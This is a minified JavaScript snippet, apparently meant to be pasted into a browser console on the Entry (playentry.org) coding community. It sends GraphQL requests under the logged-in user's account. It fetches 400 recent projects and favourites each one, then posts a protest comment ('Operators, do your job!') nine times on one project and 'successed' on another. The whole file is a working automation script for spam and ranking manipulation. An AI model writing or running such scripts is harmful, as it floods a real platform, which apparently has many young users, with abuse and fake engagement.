fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    query SELECT_PROJECTS(\\n        \\n    $query: String \\n    $categoryCode: String\\n    $staffPicked: Boolean\\n    $ranked: Boolean\\n    $parent: String\\n    $origin: String\\n    $discovery: String\\n    $pageParam: PageParam\\n    $term: String\\n    $queryTitleOnly:Boolean\\n    $isChallenge:Boolean\\n    $searchAfter: JSON\\n    $searchType: String\\n    $cacheKey: String\\n\\n    ) {\\n        projectList(\\n            \\n    query: $query\\n    categoryCode: $categoryCode\\n    staffPicked: $staffPicked\\n    ranked: $ranked\\n    parent: $parent\\n    origin: $origin\\n    discovery: $discovery\\n    pageParam: $pageParam\\n    term: $term\\n    queryTitleOnly: $queryTitleOnly\\n    isChallenge: $isChallenge\\n    searchAfter: $searchAfter\\n    searchType: $searchType\\n    cacheKey: $cacheKey\\n\\n        ) {\\n            total\\n            list {\\n                \\n    id\\n    name\\n    user {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            id\\n            filename\\n            imageType\\n        }\\n    }\\n    thumb\\n    isopen\\n    isPracticalCourse\\n    category\\n    categoryCode\\n    created\\n    updated\\n    special\\n    isForLecture\\n    isForStudy\\n    isForSubmit\\n    hashId\\n    complexity\\n    staffPicked\\n    ranked\\n    visit\\n    likeCnt\\n    comment\\n\\n            }\\n            last\\n            searchAfter\\n        }\\n    }\\n","variables":{"query":"","term":"all","listName":"projectList","searchType":"scroll","pageParam":{"sort":"published","display":400}}}',method:"POST"}).then(n=>n.json()).then(n=>{var e=n.data.projectList.list;console.log(e),e.forEach(function(n){fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:`{"query":"\\n    mutation FAV($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\\n        fav(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\\n            \\n    target\\n    targetSubject\\n    targetType\\n\\n        }\\n    }\\n","variables":{"target":"${n.id}","targetSubject":"project","targetType":"individual"}}`,method:"POST"})})});for(let n=0;n<9;n++)fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation CREATE_COMMENT(\\n        \\n    $content: String\\n    $image: String\\n    $sticker: String\\n    $target: String\\n    $targetSubject: String\\n    $targetType: String\\n    $groupId: ID\\n\\n    ) {\\n        createComment(\\n            \\n    content: $content\\n    image: $image\\n    sticker: $sticker\\n    target: $target\\n    targetSubject: $targetSubject\\n    targetType: $targetType\\n    groupId: $groupId\\n\\n        ) {\\n            warning\\n            comment {\\n                \\n    id\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    content\\n    created\\n    removed\\n    blamed\\n    commentsLength\\n    likesLength\\n    isLike\\n    hide\\n    image {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    sticker {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n\\n            }\\n        }\\n    }\\n","variables":{"content":"운영자는 일해라!","target":"6007c0de967035047efd9031","targetSubject":"project","targetType":"individual"}}',method:"POST"});fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation CREATE_COMMENT(\\n        \\n    $content: String\\n    $image: String\\n    $sticker: String\\n    $target: String\\n    $targetSubject: String\\n    $targetType: String\\n    $groupId: ID\\n\\n    ) {\\n        createComment(\\n            \\n    content: $content\\n    image: $image\\n    sticker: $sticker\\n    target: $target\\n    targetSubject: $targetSubject\\n    targetType: $targetType\\n    groupId: $groupId\\n\\n        ) {\\n            warning\\n            comment {\\n                \\n    id\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    content\\n    created\\n    removed\\n    blamed\\n    commentsLength\\n    likesLength\\n    isLike\\n    hide\\n    image {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    sticker {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n\\n            }\\n        }\\n    }\\n","variables":{"content":"successed","target":"58ec7e55a5927917af17495e","targetSubject":"project","targetType":"individual"}}',method:"POST"});
